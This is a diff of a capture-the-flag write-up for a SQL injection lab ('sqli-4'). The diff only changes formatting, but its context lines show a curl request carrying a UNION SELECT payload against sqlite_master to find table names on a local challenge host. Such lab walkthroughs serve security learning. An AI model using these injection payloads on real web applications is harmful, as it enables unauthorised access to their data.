@@ -66,7 +66,8 @@ app.config["SERVER_NAME"] = f"challenge.localhost:80"
 app.run("challenge.localhost", 80)
 hacker@web-security~sqli-4:~$
 ```
-<br>
+
+-------------------------------------------------------------
 
 ### Since the name of the table needed to inject is unknown, first step is finding the table names and getting the right one.
 
@@ -75,7 +76,7 @@ hacker@web-security~sqli-4:~$
 curl -v "http://challenge.localhost:80/?query=%22UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type=%22table"
 ```
 
-<br>
+------------------------------------------------------
 
 ### In the results just one table was returned, so this is obviously it.
 
@@ -90,7 +91,7 @@ curl -v "http://challenge.localhost:80/?query=%22UNION%20SELECT%20name%20FROM%20
 * shutting down connection #0
 ```
 
-<br>
+---------------------------------------------
 
 ### Craft the UNION SELECT request with the table name:
 
